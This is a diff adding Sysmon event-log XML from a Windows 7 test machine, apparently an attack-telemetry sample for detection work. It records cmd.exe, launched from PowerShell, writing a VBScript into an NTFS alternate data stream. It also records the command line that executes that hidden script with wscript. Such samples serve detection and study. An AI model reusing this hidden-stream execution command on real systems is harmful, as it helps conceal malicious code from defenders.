+      <Data Name="ProcessGuid">{365abb72-95e7-5cd3-0000-001046950f00}</Data>
+      <Data Name="ProcessId">2812</Data>
+      <Data Name="Image">C:\Windows\system32\cmd.exe</Data>
+      <Data Name="TargetFilename">C:\Users\IEUser\AppData</Data>
+      <Data Name="CreationUtcTime">2018-01-03 01:21:25.726</Data>
+      <Data Name="Hash">Unknown</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>11</EventID>
+      <Version>2</Version>
+      <Level>4</Level>
+      <Task>11</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:23.500263200Z" />
+      <EventRecordID>11241</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:23.500</Data>
+      <Data Name="ProcessGuid">{365abb72-95e7-5cd3-0000-001046950f00}</Data>
+      <Data Name="ProcessId">2812</Data>
+      <Data Name="Image">C:\Windows\system32\cmd.exe</Data>
+      <Data Name="TargetFilename">C:\Users\IEUser\AppData:tghjx5xz2ky.vbs</Data>
+      <Data Name="CreationUtcTime">2018-01-03 01:21:25.726</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-09T02:52:23.531513200Z" />
+      <EventRecordID>11242</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1988" ThreadID="228" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-09 02:52:23.515</Data>
+      <Data Name="ProcessGuid">{365abb72-95e7-5cd3-0000-001004970f00}</Data>
+      <Data Name="ProcessId">3784</Data>
+      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="FileVersion">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
+      <Data Name="Description">Windows Command Processor</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe"  /C "C:\Windows\wscript.exe "C:\Users\IEUser\AppData:tghjx5xz2ky.vbs""</Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\AppData\Local\Temp\onedrive\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-94cd-5cd3-0000-0020dd3a0100}</Data>
+      <Data Name="LogonId">0x13add</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163</Data>
+      <Data Name="ParentProcessGuid">{365abb72-9570-5cd3-0000-00103fc90a00}</Data>
+      <Data Name="ParentProcessId">1900</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell</Data>
+    </EventData>
+  </Event>
+</root>
